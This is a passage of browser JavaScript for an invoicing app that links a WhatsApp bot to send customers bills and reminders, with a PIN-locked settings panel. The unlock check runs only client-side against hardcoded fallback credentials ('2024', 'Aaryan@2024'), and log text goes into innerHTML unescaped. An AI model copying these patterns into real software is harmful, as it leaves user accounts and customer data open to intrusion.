    if (whatsappEventSource) {
      whatsappEventSource.close();
      whatsappEventSource = null;
    }

    whatsappEventSource = new EventSource('/api/whatsapp/events');

    whatsappEventSource.onmessage = function(event) {
      if (!event.data) return;
      try {
        const data = JSON.parse(event.data);
        if (data && data.status) {
          whatsappBotStatus = data;
          updateWhatsAppBotPillUI(whatsappBotStatus);
          updateWhatsAppBotModalUI(whatsappBotStatus);
        }
      } catch (e) {}
    };

    whatsappEventSource.onerror = function() {
      if (whatsappEventSource) {
        try { whatsappEventSource.close(); } catch (e) {}
        whatsappEventSource = null;
      }
      setupAdaptiveWhatsAppPolling();
    };
  } catch (e) {
    setupAdaptiveWhatsAppPolling();
  }
}

function setupAdaptiveWhatsAppPolling() {
  if (whatsappAdaptiveTimer) clearTimeout(whatsappAdaptiveTimer);

  const poll = async () => {
    await fetchWhatsAppBotStatus();
    const isBusy = whatsappBotStatus && (
      whatsappBotStatus.status === 'INITIALIZING' ||
      whatsappBotStatus.status === 'AUTHENTICATING' ||
      whatsappBotStatus.isDispatching
    );
    const nextInterval = isBusy ? 1200 : 6000;
    whatsappAdaptiveTimer = setTimeout(poll, nextInterval);
  };

  whatsappAdaptiveTimer = setTimeout(poll, 1200);
}

async function fetchWhatsAppBotStatus() {
  try {
    const res = await fetch('/api/whatsapp/status');
    const data = await res.json();
    whatsappBotStatus = data || { status: 'DISCONNECTED', isReady: false };
    updateWhatsAppBotPillUI(whatsappBotStatus);
    updateWhatsAppBotModalUI(whatsappBotStatus);
  } catch (err) {
    whatsappBotStatus = { status: 'DISCONNECTED', isReady: false };
    updateWhatsAppBotPillUI(whatsappBotStatus);
  }
}

function updateWhatsAppBotPillUI(data) {
  const pill = document.getElementById("live-whatsapp-pill");
  const statusText = document.getElementById("wa-bot-status-text");
  const statusIcon = document.getElementById("wa-bot-status-icon");
  const radarDot = document.getElementById("wa-radar-indicator");
  if (!pill || !statusText) return;

  pill.classList.remove("connected", "connecting", "authenticating", "initializing", "dispatching", "waiting-qr", "disconnected");

  // 1. DISPATCHING STATE (Live Animated Rotating Icon)
  if (data && data.isDispatching) {
    pill.classList.add("dispatching");
    if (radarDot) radarDot.style.display = "none";
    if (statusIcon) {
      statusIcon.className = "fa-solid fa-arrows-rotate fa-spin";
      statusIcon.style.display = "inline-block";
    }
    const invLabel = data.dispatchingDetails?.filename ? data.dispatchingDetails.filename.replace('.pdf', '') : 'Invoice';
    statusText.textContent = `Dispatching ${invLabel}...`;
    pill.title = `Sending WhatsApp document in background to ${data.dispatchingDetails?.phone || 'customer'}...`;
    return;
  }

  // 2. CONNECTED STATE (Emerald Theme, Radar Wave Pulse, Brand Icon)
  if (data && data.status === "CONNECTED") {
    pill.classList.add("connected");
    if (radarDot) radarDot.style.display = "inline-block";
    if (statusIcon) {
      statusIcon.className = "fa-brands fa-whatsapp";
      statusIcon.style.display = "inline-block";
      statusIcon.style.color = "#16a34a";
    }
    const phoneDisplay = data.clientInfo?.phone ? `+${data.clientInfo.phone}` : "Active";
    statusText.textContent = `Bot: ${phoneDisplay}`;
    pill.title = `WhatsApp Background Bot Connected (${data.clientInfo?.pushname || ''} ${phoneDisplay}) - Direct automated dispatch active`;
    return;
  }

  // 3. CONNECTING / AUTHENTICATING / INITIALIZING (Amber Theme, Rotating Dual-Ring Spinner)
  if (data && (data.status === "INITIALIZING" || data.status === "AUTHENTICATING")) {
    pill.classList.add(data.status.toLowerCase());
    if (radarDot) radarDot.style.display = "none";
    if (statusIcon) {
      statusIcon.className = "fa-solid fa-circle-notch fa-spin";
      statusIcon.style.display = "inline-block";
    }
    if (data.status === "AUTHENTICATING") {
      const pct = data.loadingPercent ? ` (${data.loadingPercent}%)` : "";
      statusText.textContent = `Authenticating${pct}...`;
      pill.title = `WhatsApp session authenticating${pct} - High-speed connection in progress`;
    } else {
      statusText.textContent = "Connecting Bot...";
      pill.title = "Starting local WhatsApp background bot engine...";
    }
    return;
  }

  // 4. WAITING FOR QR SCAN OR PAIRING CODE
  if (data && (data.status === "QR_READY" || data.status === "CODE_READY")) {
    pill.classList.add("waiting-qr");
    if (radarDot) radarDot.style.display = "none";
    if (statusIcon) {
      statusIcon.className = data.status === "CODE_READY" ? "fa-solid fa-key" : "fa-solid fa-qrcode";
      statusIcon.style.display = "inline-block";
      statusIcon.style.color = "#d97706";
    }
    statusText.textContent = data.status === "CODE_READY" ? "Enter WA Code" : "Scan WA QR";
    pill.title = "WhatsApp Bot pairing required - Click to view QR or enter pairing code";
    return;
  }

  // 5. DISCONNECTED / OFFLINE
  pill.classList.add("disconnected");
  if (radarDot) radarDot.style.display = "none";
  if (statusIcon) {
    statusIcon.className = "fa-brands fa-whatsapp";
    statusIcon.style.display = "inline-block";
    statusIcon.style.color = "#64748b";
  }
  statusText.textContent = "WhatsApp Bot";
  pill.title = "WhatsApp Bot Offline - Click to connect or use 1-Click Instant Share";
}

function updateWhatsAppBotModalUI(data) {
  const modal = document.getElementById("whatsapp-bot-modal");
  if (!modal) return;

  const statusCard = document.getElementById("wa-modal-status-card");
  const statusTitle = document.getElementById("wa-modal-status-title");
  const statusDesc = document.getElementById("wa-modal-status-desc");
  const qrSection = document.getElementById("wa-qr-section");
  const connectedSection = document.getElementById("wa-connected-section");
  const qrLoading = document.getElementById("wa-qr-loading");
  const qrImage = document.getElementById("wa-qr-image");
  const deviceName = document.getElementById("wa-device-name");
  const devicePhone = document.getElementById("wa-device-phone");

  if (!statusCard) return;
  statusCard.classList.remove("wa-status-connected", "wa-status-waiting", "wa-status-disconnected");

  if (data.status === "CONNECTED") {
    statusCard.classList.add("wa-status-connected");
    if (statusTitle) statusTitle.textContent = "WhatsApp Background Bot Active";
    if (statusDesc) statusDesc.textContent = "Your phone is linked. Bills & PDF documents will be delivered silently in background.";
    if (qrSection) { qrSection.classList.add("hidden"); qrSection.style.display = "none"; }
    if (connectedSection) { connectedSection.classList.remove("hidden"); connectedSection.style.display = "block"; }
    if (deviceName) deviceName.textContent = data.clientInfo?.pushname || "Linked WhatsApp Account";
    if (devicePhone) devicePhone.textContent = data.clientInfo?.phone ? `+${data.clientInfo.phone} (Active)` : "Connected";
  } else if (data.status === "CODE_READY" && data.pairingCode) {
    statusCard.classList.add("wa-status-waiting");
    if (statusTitle) statusTitle.textContent = "Enter 8-Digit Pairing Code on Mobile";
    if (statusDesc) statusDesc.textContent = "Open WhatsApp on your phone > Linked Devices > Link with phone number instead > enter the code below.";
    if (qrSection) { qrSection.classList.remove("hidden"); qrSection.style.display = "block"; }
    if (connectedSection) { connectedSection.classList.add("hidden"); connectedSection.style.display = "none"; }
    switchWhatsAppPairTab('code');
    const codeBox = document.getElementById("wa-code-display-box");
    const codeText = document.getElementById("wa-code-text");
    if (codeBox) codeBox.style.display = "block";
    if (codeText) {
      const c = data.pairingCode;
      codeText.textContent = c.length === 8 ? `${c.slice(0, 4)} - ${c.slice(4)}` : c;
    }
  } else if (data.status === "QR_READY" && data.qrCodeDataUrl) {
    statusCard.classList.add("wa-status-waiting");
    if (statusTitle) statusTitle.textContent = "Waiting for WhatsApp QR Scan...";
    if (statusDesc) statusDesc.textContent = "Open WhatsApp on your phone > Linked Devices > Point camera at QR code.";
    if (qrSection) { qrSection.classList.remove("hidden"); qrSection.style.display = "block"; }
    if (connectedSection) { connectedSection.classList.add("hidden"); connectedSection.style.display = "none"; }
    if (qrLoading) qrLoading.style.display = "none";
    if (qrImage) {
      qrImage.src = data.qrCodeDataUrl;
      qrImage.style.display = "block";
    }
  } else if (data.status === "INITIALIZING" || data.status === "AUTHENTICATING") {
    statusCard.classList.add("wa-status-waiting");
    if (statusTitle) statusTitle.textContent = data.status === "AUTHENTICATING" ? "Authenticating Session..." : "Starting WhatsApp Engine...";
    if (statusDesc) statusDesc.textContent = "Please wait a moment while the local WhatsApp Web bridge initializes...";
    if (qrSection) { qrSection.classList.remove("hidden"); qrSection.style.display = "block"; }
    if (connectedSection) { connectedSection.classList.add("hidden"); connectedSection.style.display = "none"; }
    if (qrLoading) qrLoading.style.display = "block";
    if (qrImage) qrImage.style.display = "none";
  } else {
    statusCard.classList.add("wa-status-disconnected");
    if (statusTitle) statusTitle.textContent = "WhatsApp Bot Disconnected";
    if (statusDesc) statusDesc.textContent = "Scan QR code or use Phone Pairing Code below to link your device.";
    if (qrSection) { qrSection.classList.remove("hidden"); qrSection.style.display = "block"; }
    if (connectedSection) { connectedSection.classList.add("hidden"); connectedSection.style.display = "none"; }
    if (qrLoading) qrLoading.style.display = "block";
    if (qrImage) qrImage.style.display = "none";
  }
}

window.switchWhatsAppPairTab = function(tab) {
  const qrTabBtn = document.getElementById("wa-tab-btn-qr");
  const codeTabBtn = document.getElementById("wa-tab-btn-code");
  const historyTabBtn = document.getElementById("wa-tab-btn-history");

  const qrSection = document.getElementById("wa-qr-section");
  const connectedSection = document.getElementById("wa-connected-section");
  const qrContent = document.getElementById("wa-tab-content-qr");
  const codeContent = document.getElementById("wa-tab-content-code");
  const historyContent = document.getElementById("wa-tab-content-history");

  const setBtnStyle = (btn, active) => {
    if (!btn) return;
    if (active) {
      btn.style.background = "#ffffff";
      btn.style.color = "#0a4b5c";
      btn.style.boxShadow = "0 1px 3px rgba(0,0,0,0.1)";
    } else {
      btn.style.background = "transparent";
      btn.style.color = "#64748b";
      btn.style.boxShadow = "none";
    }
  };

  setBtnStyle(qrTabBtn, tab === 'qr');
  setBtnStyle(codeTabBtn, tab === 'code');
  setBtnStyle(historyTabBtn, tab === 'history');

  if (tab === 'history') {
    if (qrSection) qrSection.style.display = "none";
    if (connectedSection) connectedSection.style.display = "none";
    if (historyContent) historyContent.style.display = "block";
    loadWhatsAppActivityLogs();
  } else {
    if (historyContent) historyContent.style.display = "none";
    if (whatsappBotStatus && whatsappBotStatus.isReady) {
      if (connectedSection) connectedSection.style.display = "block";
      if (qrSection) qrSection.style.display = "none";
    } else {
      if (connectedSection) connectedSection.style.display = "none";
      if (qrSection) qrSection.style.display = "block";
      if (tab === 'code') {
        if (qrContent) qrContent.style.display = "none";
        if (codeContent) codeContent.style.display = "block";
      } else {
        if (qrContent) qrContent.style.display = "block";
        if (codeContent) codeContent.style.display = "none";
      }
    }
  }
};

window.loadWhatsAppActivityLogs = async function() {
  const container = document.getElementById("wa-activity-logs-container");
  if (!container) return;

  const sec = globalSettings?.security || {};
  if (!isWhatsAppUnlocked()) {
    container.innerHTML = `
      <div style="text-align: center; padding: 24px 14px; background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 10px;">
        <div style="width: 42px; height: 42px; background: #ecfdf5; color: #059669; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px auto; font-size: 18px;">
          <i class="fa-solid fa-lock"></i>
        </div>
        <h4 style="margin: 0 0 6px 0; font-size: 13px; color: #0f172a; font-weight: 700;">Customer WhatsApp Chats &amp; History Protected</h4>
        <p style="margin: 0 0 12px 0; font-size: 11.5px; color: #64748b; line-height: 1.4;">
          Enter Admin Security PIN or Master Password to view customer dispatch history, recipient numbers, and delivery timestamps.
        </p>
        <button type="button" class="btn btn-sm btn-primary" onclick="promptWhatsAppSecurity(loadWhatsAppActivityLogs)" style="background: #075e54; border-color: #075e54; font-weight: 600; padding: 6px 14px;">
          <i class="fa-solid fa-unlock"></i> Unlock Activity History
        </button>
      </div>
    `;
    return;
  }

  try {
    const res = await fetch('/api/whatsapp/activity');
    const data = await res.json();
    const logs = (data && data.logs) || [];
    if (logs.length === 0) {
      container.innerHTML = `
        <div style="text-align: center; color: #94a3b8; padding: 24px 12px; font-size: 12px;">
          <i class="fa-solid fa-paper-plane" style="font-size: 24px; color: #cbd5e1; margin-bottom: 8px; display: block;"></i>
          No WhatsApp dispatches recorded yet.<br>Invoices & reminders sent will appear here automatically.
        </div>
      `;
      return;
    }

    const maskPhones = sec.whatsappMaskPhones !== false;
    let html = '<div style="display: flex; flex-direction: column; gap: 8px;">';
    logs.forEach(log => {
      const isPdf = log.type === 'INVOICE_PDF';
      const timeStr = log.timestamp ? new Date(log.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
      const dateStr = log.timestamp ? new Date(log.timestamp).toLocaleDateString([], { month: 'short', day: 'numeric' }) : '';
      const badgeBg = isPdf ? '#e0f2fe' : '#ecfdf5';
      const badgeColor = isPdf ? '#0284c7' : '#059669';
      const badgeIcon = isPdf ? 'fa-file-pdf' : 'fa-comment-dots';
      const badgeText = isPdf ? 'PDF Invoice' : 'Text Reminder';
      const detail = log.filename || log.preview || 'Delivered message';
      
      let phoneClean = 'Customer';
      if (log.phone) {
        const rawDigits = log.phone.toString().replace(/\D/g, '');
        if (maskPhones && rawDigits.length >= 10) {
          phoneClean = `+91 ${rawDigits.slice(0, 2)}•••••${rawDigits.slice(-3)}`;
        } else {
          phoneClean = `+${rawDigits}`;
        }
      }

      html += `
        <div style="background: white; border: 1px solid #e2e8f0; border-radius: 8px; padding: 10px 12px; font-size: 11.5px; display: flex; align-items: center; justify-content: space-between; gap: 10px;">
          <div style="display: flex; align-items: center; gap: 10px; overflow: hidden;">
            <span style="background: ${badgeBg}; color: ${badgeColor}; padding: 3px 8px; border-radius: 6px; font-size: 10.5px; font-weight: 700; white-space: nowrap; display: flex; align-items: center; gap: 4px;">
              <i class="fa-solid ${badgeIcon}"></i> ${badgeText}
            </span>
            <div style="overflow: hidden;">
              <div style="font-weight: 700; color: #1e293b; white-space: nowrap; text-overflow: ellipsis; overflow: hidden;">${phoneClean}</div>
              <div style="font-size: 10.5px; color: #64748b; white-space: nowrap; text-overflow: ellipsis; overflow: hidden;">${detail}</div>
            </div>
          </div>
          <div style="text-align: right; white-space: nowrap;">
            <div style="font-weight: 700; color: #10b981; font-size: 11px;"><i class="fa-solid fa-circle-check"></i> Sent</div>
            <div style="font-size: 10px; color: #94a3b8;">${dateStr} ${timeStr}</div>
          </div>
        </div>
      `;
    });
    html += '</div>';
    container.innerHTML = html;
  } catch (err) {
    container.innerHTML = `<div style="color: #ef4444; font-size: 11.5px; padding: 12px; text-align: center;">Error loading history: ${err.message}</div>`;
  }
};

window.requestWhatsAppPairCode = async function() {
  if (!isWhatsAppUnlocked()) {
    promptWhatsAppSecurity(window.requestWhatsAppPairCode);
    return;
  }
  const phoneInput = document.getElementById("wa-pair-phone-input");
  const codeBox = document.getElementById("wa-code-display-box");
  const codeText = document.getElementById("wa-code-text");
  const phone = phoneInput ? phoneInput.value.trim().replace(/\D/g, '') : "";

  if (!phone || phone.length < 10) {
    alert("Please enter a valid 10-digit mobile number.");
    return;
  }

  if (codeBox) codeBox.style.display = "block";
  if (codeText) codeText.innerHTML = '<i class="fa-solid fa-spinner fa-spin" style="font-size: 20px;"></i> Generating Code...';

  try {
    const res = await fetch('/api/whatsapp/pair-code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone })
    });
    const data = await res.json();
    if (data && data.ok && data.code) {
      const c = data.code;
      if (codeText) codeText.textContent = c.length === 8 ? `${c.slice(0, 4)} - ${c.slice(4)}` : c;
    } else {
      if (codeText) codeText.textContent = "Try again";
      alert(data.error || "Failed to generate pairing code. Please try QR scan.");
    }
  } catch (err) {
    if (codeText) codeText.textContent = "Error";
    alert("Connection error: " + err.message);
  }
};

// --- WHATSAPP SECURITY & PRIVACY CONTROLLER ---
let isWhatsAppSessionUnlocked = false;
let whatsappUnlockExpiry = 0;
let pendingWhatsAppCallback = null;

window.isWhatsAppUnlocked = function() {
  const sec = globalSettings?.security || {};
  if (sec.whatsappLockEnabled === false) return true; // Security lock disabled by admin
  if (!isWhatsAppSessionUnlocked) return false;
  if (whatsappUnlockExpiry && Date.now() > whatsappUnlockExpiry) {
    isWhatsAppSessionUnlocked = false;
    whatsappUnlockExpiry = 0;
    return false;
  }
  return true;
};

window.promptWhatsAppSecurity = function(onSuccessCallback = null) {
  const sec = globalSettings?.security || {};
  if (sec.whatsappLockEnabled === false || isWhatsAppUnlocked()) {
    if (typeof onSuccessCallback === 'function') onSuccessCallback();
    return;
  }

  pendingWhatsAppCallback = onSuccessCallback;
  const lockModal = document.getElementById("whatsapp-lock-modal");
  const pinInput = document.getElementById("wa-lock-pin-input");
  const errBlock = document.getElementById("wa-lock-error");

  if (errBlock) errBlock.classList.add("hidden");
  if (pinInput) {
    pinInput.value = "";
    pinInput.type = "password";
  }
  const eyeIcon = document.getElementById("wa-lock-eye-icon");
  if (eyeIcon) eyeIcon.className = "fa-solid fa-eye";

  if (lockModal) {
    lockModal.classList.remove("hidden");
    lockModal.style.setProperty("display", "flex", "important");
    lockModal.style.setProperty("visibility", "visible", "important");
    lockModal.style.setProperty("opacity", "1", "important");
    lockModal.style.setProperty("pointer-events", "auto", "important");
    lockModal.style.setProperty("z-index", "2147483645", "important");
  }

  setTimeout(() => {
    if (pinInput) pinInput.focus();
  }, 100);
};

window.closeWhatsAppLockModal = function(e) {
  if (e && e.stopPropagation) e.stopPropagation();
  const lockModal = document.getElementById("whatsapp-lock-modal");
  if (lockModal) {
    lockModal.classList.add("hidden");
    lockModal.style.setProperty("display", "none", "important");
    lockModal.style.setProperty("visibility", "hidden", "important");
    lockModal.style.setProperty("opacity", "0", "important");
    lockModal.style.setProperty("pointer-events", "none", "important");
  }
  pendingWhatsAppCallback = null;
};

window.appendWaKeypadDigit = function(digit) {
  const pinInput = document.getElementById("wa-lock-pin-input");
  if (!pinInput) return;
  if (pinInput.value.length < 16) {
    pinInput.value += digit;
  }
  const errBlock = document.getElementById("wa-lock-error");
  if (errBlock) errBlock.classList.add("hidden");
};

window.clearWaKeypad = function() {
  const pinInput = document.getElementById("wa-lock-pin-input");
  if (pinInput) pinInput.value = "";
  const errBlock = document.getElementById("wa-lock-error");
  if (errBlock) errBlock.classList.add("hidden");
};

window.backspaceWaKeypad = function() {
  const pinInput = document.getElementById("wa-lock-pin-input");
  if (pinInput && pinInput.value.length > 0) {
    pinInput.value = pinInput.value.slice(0, -1);
  }
  const errBlock = document.getElementById("wa-lock-error");
  if (errBlock) errBlock.classList.add("hidden");
};

window.toggleWaLockPinVisibility = function() {
  const pinInput = document.getElementById("wa-lock-pin-input");
  const eyeIcon = document.getElementById("wa-lock-eye-icon");
  if (!pinInput) return;
  if (pinInput.type === "password") {
    pinInput.type = "text";
    if (eyeIcon) eyeIcon.className = "fa-solid fa-eye-slash";
  } else {
    pinInput.type = "password";
    if (eyeIcon) eyeIcon.className = "fa-solid fa-eye";
  }
};

window.submitWhatsAppUnlock = function(e) {
  if (e && e.preventDefault) e.preventDefault();
  const pinInput = document.getElementById("wa-lock-pin-input");
  const errBlock = document.getElementById("wa-lock-error");
  const errText = document.getElementById("wa-lock-error-text");
  const card = document.querySelector("#whatsapp-lock-modal .wa-lock-card");

  const entered = (pinInput ? pinInput.value : "").trim();
  const sec = globalSettings?.security || {};
  const targetPin = (sec.whatsappPin || "2024").toString().trim();
  const masterPassword = (sec.password || activePassword || "Aaryan@2024").toString().trim();

  if (!entered) {
    if (errText) errText.textContent = "Please enter Security PIN or Password!";
    if (errBlock) errBlock.classList.remove("hidden");
    return;
  }

  // Validate entered credentials against target PIN or master login password
  if (entered === targetPin || entered === masterPassword) {
    isWhatsAppSessionUnlocked = true;
    const autolockVal = sec.whatsappAutoLockMinutes || "15";
    if (autolockVal !== "immediate" && autolockVal !== "screen" && !isNaN(parseInt(autolockVal))) {
      whatsappUnlockExpiry = Date.now() + (parseInt(autolockVal) * 60 * 1000);
    } else {
      whatsappUnlockExpiry = 0;
    }

    closeWhatsAppLockModal();
    if (typeof showFloatingToast === 'function') {
      showFloatingToast("🔓 WhatsApp unlocked successfully!", 3000);
    }

    const callback = pendingWhatsAppCallback;
    pendingWhatsAppCallback = null;
    if (typeof callback === 'function') {
      callback();
    } else {
      _openWhatsAppBotModalActual();
    }
  } else {
    if (errText) errText.textContent = "Incorrect PIN or Password! Access denied.";
    if (errBlock) errBlock.classList.remove("hidden");
    if (card) {
      card.classList.remove("wa-lock-shake");
      void card.offsetWidth;
      card.classList.add("wa-lock-shake");
    }
    if (pinInput) {
      pinInput.value = "";
      pinInput.focus();
    }
  }
};

window.lockWhatsAppSession = function(showToast = true) {
  isWhatsAppSessionUnlocked = false;
  whatsappUnlockExpiry = 0;
  closeWhatsAppBotModal();
  if (showToast) {
    if (typeof showFloatingToast === 'function') {
      showFloatingToast("🔒 WhatsApp session locked securely.", 3000);
    } else {
      alert("WhatsApp session locked securely.");
    }
  }
  const statusInd = document.getElementById("wa-lock-status-indicator");
  if (statusInd) {
    statusInd.textContent = "Locked";
    statusInd.style.color = "#dc2626";
  }
};

window.openWhatsAppBotModal = function() {
  if (!isWhatsAppUnlocked()) {
    promptWhatsAppSecurity(() => _openWhatsAppBotModalActual());
    return;
  }
  _openWhatsAppBotModalActual();
};

function _openWhatsAppBotModalActual() {
  const modal = document.getElementById("whatsapp-bot-modal");
  if (modal) {
    modal.classList.remove("hidden");
    modal.style.setProperty("display", "flex", "important");
    modal.style.setProperty("visibility", "visible", "important");
    modal.style.setProperty("opacity", "1", "important");
    modal.style.setProperty("pointer-events", "auto", "important");
    modal.style.setProperty("z-index", "2147483640", "important");
  }
  
  const settings = globalSettings || {};
  const autoSendToggle = document.getElementById("wa-auto-send-toggle");
  if (autoSendToggle) autoSendToggle.checked = settings.whatsappAutoSend !== false;
  
  const fallbackToggle = document.getElementById("wa-fallback-1click-toggle");
  if (fallbackToggle) fallbackToggle.checked = settings.whatsappFallback1Click !== false;

  fetchWhatsAppBotStatus();
  if (whatsappPollInterval) clearInterval(whatsappPollInterval);
  whatsappPollInterval = setInterval(fetchWhatsAppBotStatus, 2000);

  initiateWhatsAppConnect();
}

window.closeWhatsAppBotModal = function(e) {
  if (e && e.stopPropagation) e.stopPropagation();
  const modal = document.getElementById("whatsapp-bot-modal");
  if (modal) {
    modal.classList.add("hidden");
    modal.style.setProperty("display", "none", "important");
    modal.style.setProperty("visibility", "hidden", "important");
    modal.style.setProperty("opacity", "0", "important");
    modal.style.setProperty("pointer-events", "none", "important");
  }
  if (whatsappPollInterval) {
    clearInterval(whatsappPollInterval);
    whatsappPollInterval = null;
  }

  const sec = globalSettings?.security || {};
  if (sec.whatsappAutoLockMinutes === "immediate") {
    isWhatsAppSessionUnlocked = false;
    whatsappUnlockExpiry = 0;
  }
};

window.initiateWhatsAppConnect = async function(forceClean = false) {
  const qrLoading = document.getElementById("wa-qr-loading");
  const qrImage = document.getElementById("wa-qr-image");
  if (qrLoading) qrLoading.style.display = "block";
  if (qrImage) qrImage.style.display = "none";

  try {
    const res = await fetch('/api/whatsapp/connect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ forceClean })
    });
    const data = await res.json();
    if (data) {
      whatsappBotStatus = data;
      updateWhatsAppBotPillUI(whatsappBotStatus);
      updateWhatsAppBotModalUI(whatsappBotStatus);
    }
  } catch (e) {
    console.error("Connect error:", e);
  }
};

window.disconnectWhatsAppBot = async function() {
  if (!isWhatsAppUnlocked()) {
    promptWhatsAppSecurity(window.disconnectWhatsAppBot);
    return;
  }
  if (!confirm("⚠️ Are you sure you want to disconnect/unlink this WhatsApp device?")) return;
  try {
    const res = await fetch('/api/whatsapp/disconnect', { method: 'POST' });
    const data = await res.json();
    fetchWhatsAppBotStatus();
    if (typeof showFloatingToast === 'function') {
      showFloatingToast("WhatsApp device disconnected successfully.", 3000);
    }
  } catch (e) {
    console.error("Disconnect error:", e);
  }
};

window.sendWhatsAppTestMessage = async function() {
  const phoneInput = document.getElementById("wa-test-phone");
  const statusEl = document.getElementById("wa-test-status");
  const phone = phoneInput ? phoneInput.value.trim() : "";
  if (!phone || phone.replace(/\D/g, '').length < 10) {
    if (statusEl) {
      statusEl.style.color = "#ef4444";
      statusEl.textContent = "❌ Please enter a valid 10-digit mobile number.";
    }
    return;
  }

  if (statusEl) {
    statusEl.style.color = "#0891b2";
    statusEl.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Sending test message to +91${phone}...`;
  }

  try {
    const testMsg = `🔔 *WhatsApp Bot Test Message*\n🏛️ *${globalSettings.company?.name || 'AARYAN AQUA NEEDS'}*\n\n✅ Automation bridge is working properly! Invoices and reports will be delivered automatically.`;
    const res = await fetch('/api/whatsapp/send-message', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone, text: testMsg })
    });
    const result = await res.json();
    if (result && result.ok) {
      if (statusEl) {
        statusEl.style.color = "#10b981";
        statusEl.textContent = `✅ Test message successfully delivered to +91${phone}!`;
      }
    } else {
      if (statusEl) {
        statusEl.style.color = "#ef4444";
        statusEl.textContent = `❌ Send failed: ${result.error || 'Check WhatsApp connection'}`;
      }
    }
  } catch (err) {
    if (statusEl) {
      statusEl.style.color = "#ef4444";
      statusEl.textContent = `❌ Network error: ${err.message}`;
    }
  }
};

window.saveWhatsAppSettings = function() {
  const autoSendToggle = document.getElementById("wa-auto-send-toggle");
  const fallbackToggle = document.getElementById("wa-fallback-1click-toggle");
  if (autoSendToggle) globalSettings.whatsappAutoSend = autoSendToggle.checked;
  if (fallbackToggle) globalSettings.whatsappFallback1Click = fallbackToggle.checked;
  localStorage.setItem("settings", JSON.stringify(globalSettings));
};

// --- FORMAT WHATSAPP INVOICE SUMMARY ---
function formatInvoiceWhatsAppSummary(details) {
  const total = parseFloat(details.total || 0);
  const status = details.paymentStatus || 'Paid';
  const paid = parseFloat(details.paidAmount !== undefined ? details.paidAmount : (status === 'Paid' ? total : 0));
  const balance = Math.max(0, total - paid);
  const realUpiId = (globalSettings.upiId || globalSettings.bank?.upi || "7386262139@upi").trim();

  let text = `🏛️ *${globalSettings.company?.name || 'AARYAN AQUA NEEDS'}*\n`;
  text += `-----------------------------------\n`;
  text += `📄 *Tax Invoice #:* #${details.invoiceNo} (${details.invoiceType || 'Tax Invoice'})\n`;
  text += `👤 *Customer:* ${details.buyer?.name || 'Customer'}\n`;
  text += `📅 *Date:* ${details.invoiceDate || ''}\n`;
  text += `💰 *Grand Total:* ₹ ${formatCurrency(total)}\n`;

  if (balance <= 0 || status === 'Paid') {
    text += `✅ *Payment Status:* FULLY PAID (₹ ${formatCurrency(total)})\n`;
    text += `💳 *Payment Mode:* ${details.paymentMode || 'UPI / Cash'}\n`;
    text += `-----------------------------------\n`;
    text += `Thank you for your business! 🙏`;
  } else {
    text += `✅ *Amount Paid:* ₹ ${formatCurrency(paid)}\n`;
    text += `🔴 *PENDING BALANCE DUE:* ₹ ${formatCurrency(balance)}\n`;
    text += `-----------------------------------\n`;
    text += `📲 *Pay Pending Balance via UPI:*\n`;
    text += `UPI ID: *${realUpiId}*\n\n`;
    text += `Kindly clear the pending balance at your earliest convenience. Thank you! 🙏`;
  }
  return text;
}

// --- GENERATE INVOICE PDF BLOB & UPLOAD IN BACKGROUND ---
async function generateInvoicePdfBlob(details) {
  populateA4PrintOverlay(details);
  const printWrapper = document.getElementById("print-invoice-wrapper");
  if (!printWrapper) throw new Error("Print layout wrapper missing");

  printWrapper.style.display = "block";
  document.body.classList.remove("printing-thermal");

  const customerClean = (details.buyer?.name || 'Customer').replace(/[^a-zA-Z0-9]/g, '_');
  const filename = `Invoice_${details.invoiceNo}_${customerClean}.pdf`;

  const opt = {
    margin: [3, 3, 3, 3],
    filename: filename,
    image: { type: 'jpeg', quality: 0.95 },
    html2canvas: { scale: 1.35, useCORS: true, logging: false },
    jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
  };

  let blob = null;
  try {
    blob = await html2pdf().set(opt).from(printWrapper).outputPdf('blob');
  } finally {
    printWrapper.style.display = "none";
  }

  const reader = new FileReader();
  const pdfBase64 = await new Promise((resolve) => {
    reader.onloadend = () => resolve(reader.result);
    reader.readAsDataURL(blob);
  });

  // Automatically save to local disk & Google Drive backend in background
  try {
    fetch("/api/invoices/upload-pdf", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        filename: filename,
        invoiceNo: details.invoiceNo,
        id: details.id,
        pdfBase64: pdfBase64
      })
    }).then(r => r.json()).then(uploadRes => {
      const pUrl = uploadRes ? (uploadRes.pdfUrl || uploadRes.googleDriveUrl || uploadRes.viewUrl || uploadRes.url) : null;
      if (uploadRes && uploadRes.ok && pUrl) {
        details.pdfUrl = pUrl;
        const idx = invoicesDb.findIndex(i => i.id === details.id || i.invoiceNo === details.invoiceNo);
        if (idx > -1) {
          invoicesDb[idx].pdfUrl = pUrl;
          if (invoicesDb[idx].details) invoicesDb[idx].details.pdfUrl = pUrl;
          localStorage.setItem("invoices", JSON.stringify(invoicesDb));
        }
      }
    }).catch(e => console.warn("Upload PDF background sync note:", e));
  } catch (e) {}

  return { blob, pdfBase64, filename };
}

// Automatic Silent WhatsApp Dispatch upon bill generation (100% Automated Backend Process, NO Browser Redirect)
async function autoDispatchInvoiceToWhatsApp(details, precomputedBase64 = null) {
  if (!details || !details.invoiceNo) return false;
  let rawPhone = getCustomerPhoneNumber(details);
  if (!rawPhone || rawPhone.toString().replace(/\D/g, '').length < 10) {
    console.log("No valid phone number for auto WhatsApp dispatch");
    return false;
  }
  const cleanPhone = formatWhatsAppPhone(rawPhone);

  const text = typeof generateWhatsAppInvoiceMessage === 'function'
    ? generateWhatsAppInvoiceMessage(details)
    : formatInvoiceWhatsAppSummary(details);
  const custName = details.buyer?.name || details.customerName || 'Customer';
  const customerClean = custName.replace(/[^a-zA-Z0-9]/g, '_');
  const filename = `Invoice_${details.invoiceNo}_${customerClean}.pdf`;

  // Check live status if needed
  if (!whatsappBotStatus || !whatsappBotStatus.isReady) {
    try {
      const liveRes = await fetch('/api/whatsapp/status').then(r => r.json()).catch(() => null);
      if (liveRes && liveRes.isReady) {
        whatsappBotStatus = liveRes;
